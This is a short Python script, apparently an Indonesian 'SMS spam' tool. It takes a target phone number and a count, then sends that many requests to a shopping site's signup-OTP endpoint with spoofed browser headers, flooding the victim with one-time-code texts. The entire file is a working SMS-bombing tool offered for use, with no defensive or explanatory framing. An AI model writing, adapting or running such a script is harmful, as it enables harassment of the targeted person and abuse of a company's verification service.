#yg NYOLONG SC GUA KEK K0NT0|_
import json
import requests
import os
import sys

def main():
        os.system('clear')
        os.system('figlet mr.foxs spam sms')
        barner = '''
___________________________________________________
|   [•]Pembuat=Mrfoxs                             |
|   [•]Alamat github=https://github.com/Mrfoxs26  |
|   [√]Done                                       |
|   [•]No.pembuat:089513540577                    |
|_________________________________________________|

'''
        print(barner)
        no = input('Target : ')
        jumlah = input('Jumlah Spam : ')

        head = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
        }


        dat = {
        'phone' : no
        }



        for x in range(int(jumlah)):
                leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
                if 'error' in leosureo:
                        print(' gagal mengirim spam '+ no)
                else:
                        print(' berhasil mengirim spam  '+ no)

main()
